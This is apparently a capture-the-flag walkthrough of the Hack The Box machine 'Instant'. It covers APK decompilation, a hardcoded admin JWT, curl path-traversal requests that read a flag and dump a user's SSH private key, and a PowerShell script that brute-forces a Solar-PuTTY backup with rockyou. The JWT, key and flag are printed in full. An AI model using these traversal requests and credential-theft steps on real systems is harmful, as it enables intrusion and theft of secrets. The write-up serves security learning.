
starting with nmap 

```bash
sudo nmap  -sC -sV -T4 -p- -oN instant 10.129.198.124
```

![[Pasted image 20241015232055.png]]


just a website 

```
add instant.htb to /etc/hosts
```

this website had a link to download an ==apk ==file other than that nothing really interesting

using apktool , let's decompile this file

```bash
apktool d instant.apk -o instant-ap
```
![[Pasted image 20241015232418.png]]

after two 2000 years of scrolling on those files 

I found 2 interesting information

1 . the file /instant/instant-apk/res/xml/network_security_config.xml

mention 2 subdomains
```xml
<?xml version="1.0" encoding="utf-8"?>

<network-security-config>

<domain-config cleartextTrafficPermitted="true">

<domain includeSubdomains="true">mywalletv1.instant.htb</domain>

<domain includeSubdomains="true">swagger-ui.instant.htb</domain>

</domain-config>

</network-security-config>
```

2 . potential jwt of an admin in instant/instant/smali/com/instantlabs/instant/AdminActivities.smali

```java
.class public Lcom/instantlabs/instant/AdminActivities;
.super Ljava/lang/Object;
.source "AdminActivities.java"

move-result-object v1

    const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

```


let's check the subdomains

it's seems like an api 

![[Pasted image 20241015233002.png]]



an intersting API , that allow the user to read log , but we are not authorized to use it 
![[Pasted image 20241015233112.png]]

```bash
curl curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=%2Fhome%2Fshirohige%2Fuser.txt" -H  "accept: application/json"
```

I tried the ==jwt key== founded earlier and it works 

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fshirohige%2Fuser.txt" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"/home/shirohige/logs/../../../../../../../../home/shirohige/user.txt":["c8793e869c888292d6850a39cbc373c7\n"],"Status":201}
```


let's grab the ssh key 

```bash
 curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1874  100  1874    0     0  16812      0 --:--:-- --:--:-- --:--:-- 16882
{
  "/home/shirohige/logs/../../../../../../../../home/shirohige/.ssh/id_rsa": [
    "-----BEGIN RSA PRIVATE KEY-----\n",
    "MIIEoQIBAAKCAQEAiOfpiPsPftIWtmWT1x9unQtR0srvDPUGhDjgjn3UEBejx2vh\n",
    "qlTJ+8NrrA1PcQeSuiGm6oB727HSZFrI6Pd5rmRUAMRzRxjwCnMqblmkKLZPv70x\n",
    "wh8AYvJf1z3UQ7TRN24kO7pL/6mDGBxxu9kKVBv0hD3AIkrCmRtplWzhWPEvVuEx\n",
    "c8ARVrE20QBOSWXu1o8dZ1h7VPlJ/lfBs0d2FVc+M9x4LCkjjrNkZhtCnVMFMq2W\n",
    "3D3JmfBZbbo1yYUXqKlbGr4D0cabK0PLb7RUZy+2HNdcNfvOIALs0pkO1FADoTgA\n",
    "fLyUlVnu70aRQdYhGx8eY/UTkDQrrZMtI5dCxQIDAQABAoH/MbTxdhprqmrfadGz\n",
    "dLRBUHp/MNsJFNMnodAwB7QsyP4Va45Be38y4L5ZCcUX3aWL0lHglRwD6akATM/h\n",
    "+mquD9HfJbtL3QzQcPQ0Qc9G2EjASAVik9zBnZxVUSDBWzQ6yLAndFZAN7RUHSPS\n",
    "9aOfUZdZxZkq+sNpNzfDXTRI7RwjQx+lrW8AVdCQzdFWLUgpKrEDW87IgacgkgXM\n",
    "TGYv+2xlNd8fN6/1NKOoH2rsptk8LxLc5wtGXmGr97WtcdZfh2oUfiSGAc50a1yb\n",
    "MggySeWqPjN2lgt1hUXqDgRXCstN3RwUN7NfpUvoE5r9J/9NCLz5RFJ4+rTYcY4v\n",
    "oRvNAoGBALwCd1frvYDD/m5R8Q5XWXXe4j2pBDA71EpvlO0eiLpJkLXEQhkct4Od\n",
    "nKZzf7lVaQdxacC4W3Swn7rB4VL+AvKQmhfVWcAp6QRYYoQ6f2VWepNaeeXfIXAg\n",
    "vdm1vg+QRToZNbyfkFhuh1OfThWdHVnwh57aZDgC+eFCS/u8mV8zAoGBALpqXwvw\n",
    "/BS7qPgnXun4pMcRXvlb/g5/kRmgaWTraDqe4kmYrphwZyBcnJyWMJBZ0NXRlXCx\n",
    "W2wrU0xoA//X9/gyOEIPckbkTQ/H+Zoo9/Dvr27ZDdOafQc84vpsWFqZu7aoUC9l\n",
    "mGHdOVpUWusTt0S8rDkFun7CPtCtRuO9RzYnAoGAdhwKg0ZKd2EpLn71s6+2OLE7\n",
    "accLJY4AcH6mjUv4Uycx7K6NY59BvkI+jebTH0gDwjRCXlqywZzPy5BPEEcY7O9g\n",
    "joZuaqUpiJxJz428SJpKSNW27Gz/YaSAAAwHiVl10+jQdF29XYCaLTNP544bSUws\n",
    "tuO1v+ZGundeqpextjcCgYBDvL9I0Ypn5kDh2zyL/EOz6kX+ikTo88W/8CAcAcZf\n",
    "9rf3UjmvPrjac4ydAZ4n9dsCtyN8TZYQ2jVsgCdj4hBC6cyzhHVb+T1fTKUQNW7S\n",
    "5+VxfAGgMHTaGm/H23LHiTFCkCqC7oHOndpnTluzK/jeS0ixd7lqsh6tKSmnO3IS\n",
    "5QKBgQC3dxOmpw1Dz8NkE1o9Lc4gALsC8Mt0K9XU8Djn0X5bzZJ7GRx+QM0tOjf5\n",
    "rHeMqTproydbKcbTF4aQ9V1RORcqgoV013eRcaKnEXLuZwg0qbBeHx5UHKwyNr7l\n",
    "x7WHyKl+y+P2Taud0Kcmd9DJ/yQJ4wFdn0cbInxpcNKthZZLhw==\n",
    "-----END RSA PRIVATE KEY-----\n"
  ],
  "Status": 201
}
```


I saved the key in file and asked chatgpt how to clean it

```bash
sed  -i 's/[[:space:]]*"//g; s/\\n//g; s/,//g' user_rsa 
chmod 600 user_rsa
ssh shirohige@instant.htb -i user_rsa
```

![[Pasted image 20241015234411.png]]

I found this backup file 
```bash
/opt/backups/Solar-PuTTY/sessions-backup.dat
```


this tool can decrypt this but we need password ,  and it's only works on windows 


so with the help of chatgpt again , I made a small powershell script to bruteforce this

```powershell

$rockyouPath = "C:\Users\d0s3nt\Documents\instant\rockyou.txt"
$decryptExePath = "C:\Users\d0s3nt\Documents\instant\SolarPuttyDecrypt.exe"
$sessionsFilePath = "C:\Users\d0s3nt\Documents\instant\sessions-backup.dat"

function Invoke-Bruteforce {
    Get-Content -Path $rockyouPath | ForEach-Object {
        $password = $_.Trim()
        try {
            # Run the decryption executable with the current password
	    Write-Host $password
            & $decryptExePath $sessionsFilePath $password
        }
        catch {
            Write-Output "Error: $_"
        }
    }
}

Invoke-Bruteforce
```

after transferring the files , and running the script

![[Pasted image 20241016025744.png]]


![[Pasted image 20241016025903.png]]